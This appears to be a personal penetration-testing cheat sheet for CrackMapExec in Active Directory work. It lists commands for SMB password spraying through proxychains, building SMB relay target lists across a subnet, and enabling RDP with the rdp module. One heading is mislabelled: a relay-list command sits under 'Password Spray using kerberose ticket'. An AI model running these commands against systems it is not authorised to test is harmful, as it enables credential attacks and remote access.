---
title: "frank4o4"
classes: wide
header:
#
ribbon: black 
description: "Crackmapexec"
categories:
  - AD
tags:
  - AD
toc: true
---

# Crackmapexec



Using password to password spray

```
proxychains crackmapexec smb 172.16.76.151 -u <username> -p <password>
```

Password Spray using kerberose ticket

```
crackmapexec smb --gen-relay-list smb_tarsgets.txt 192.168.1.0/24
```


Using RDP module
```
Syntax:
crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M rdp

Local admin:
crackmapexec smb <IP Address> -u Administrator -p <password> -d . -M rdp
crackmapexec smb <IP Address> -u Administrator -p <password> --local-auth -M rdp

Domain user:
crackmapexec smb <IP Address> -u <target username> -p <password> -d target.corp -M rdp
```